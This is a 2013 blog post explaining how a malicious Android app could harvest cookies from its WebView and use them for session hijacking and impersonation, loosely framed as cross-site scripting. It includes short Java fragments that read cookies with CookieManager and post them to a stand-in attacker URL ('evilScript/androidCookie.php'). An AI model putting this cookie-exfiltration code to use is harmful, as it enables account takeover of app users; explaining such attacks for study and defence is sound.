+++
author = "Bhavani Anantapur Bache"
title = "Cross-site Scripting Attacks on Android WebView"
date = "2013-04-05"
description = "Cross-site Scripting Attacks on Android WebView"
featured = true
tags = [
    "Programming",
    "Android",
    "Embedded Systems",
]
categories = [
    "Programming",
    "Android",
    "Embedded Systems"
]
series = ["Embedded Systems"]
aliases = ["migrate-from-jekyl"]
thumbnail = "images/building.png"
+++
WebView is an essential component in Android and iOS. It enables applications to display content from on-line resources. It simplifies task of performing a network request, parsing the data and rendering it. WebView uses a number of APIs which can interact with the web contents inside WebView. In the present post, Cross-site scripting attacks or XSS attacks specific to Android WebView are discussed. Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability makes it possible for attackers to run malicious code into victim’s WebView, through HttpClient APIs. Using this malicious code, the attackers can steal the victim’s credentials, such as cookies. The access control policies (i.e.,the same origin policy) employed by the browser to protect those credentials can be bypassed by exploiting the XSS vulnerability.
<h3>Cross-site scripting (XSS)</h3>
Cross-site scripting (XSS) is a type of computer security vulnerability typically found in Web Applications. To protect the user’s environment from malicious code, browsers use a sand-boxing mechanism that limits a script to access only resources associated with its origin site. Unfortunately, these security mechanisms fail if a user unknowingly executes a malicious script from an intermediate, trusted site. In this case, the malicious script is granted full access to all resources (e.g. Authentication tokens and cookies) that belong to the trusted site. Such attacks are called cross-site scripting (XSS) attacks. In the present work, Cross-site scripting attacks on Android WebView are investigated. By finding ways of executing malicious scripts through the third party malicious app on phone, an attacker can gain elevated access-privileges to sensitive page content, session cookies, and a variety of other information in the phone such as contacts.

<h3>Stealing cookies from the victim’s device </h3>
The most common behavior of XSS attacks is to gather cookies. Cookies are small text files that reside on a user’s computer and store name-value pairs along with some metadata. Cookies are commonly used to store information intended to be persistent during a browser session or from session to session, such as session IDs, user preferences, or login information. The cookie specifications assume that only the domain that set the cookie will be able to access it.

<h3>Attack Method</h3>
When the user runs the application through the WebView, Android applications can monitor the events occurred within WebView. We override the shouldOverrideUrlLoading hook, which is triggered by the navigation event, (when the user tries to navigate to another URL). Cookies can be gathered at every page navigation of the user using the method getCookie() from CookieManager class as shown in the code fragment below:

````java
CookieManager cookieManager = CookieManager.getInstance();
final String cookie = cookieManager.getCookie(url);
````

Through HttpPost, malicious script can be run on the user’s Android device, cookies and URL can be sent to any third party (i.e., the attacker’s server), thus avoiding the same-origin policy or cookie protection mechanism.

````java
HttpClient httpClient = new DefaultHttpClient();
HttpPost httpPost = new HttpPost(“http://evilScript/androidCookie.php");
````
The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen.
<h3>Session Hijacking</h3>
Session hijacking is a method of taking over a Web user session by stealthily obtaining the session ID and gaining unauthorized access. The session ID is normally stored within a cookie or URL. Once the user’s session ID has been accessed, the attacker can masquerade as that user and do anything the user is authorized to do on the network. From the web server’s point of view, a request from an attacker has the same authentication as the victim’s requests, thus the request is performed on behalf of the victim’s session. This usually results in the attacker being able to perform all normal web application functions with the same privileges of legitimate user (e.g. online bill pay, composing an email, etc.).

<h3>Impersonating user using stolen cookies</h3>
If a website uses cookies as session identifiers, attackers can impersonate users after stealing victim’s cookies. By stealing cookies of social networking sites, message boards or forums, the attacker can post a new message in the victim’s name delete the victim’s post or exploit user’s credentials without his consent.

NOTE: Please see the [research publication]("http://ijcsn.org/IJCSN-2013/2-2/IJCSN-2013-2-2-03.pdf") for more details
